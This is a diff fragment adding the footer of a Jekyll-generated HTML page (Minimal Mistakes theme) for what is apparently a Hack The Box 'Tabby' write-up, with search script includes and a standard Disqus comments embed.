+<div class="page__footer-copyright">&copy; 2025 <a href="https://dcodezero.github.io/">https://dcodezero.github.io/</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/hackthebox/Tabby/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/hackthebox/Tabby"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://dcode_zero.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+  </body>
+</html>
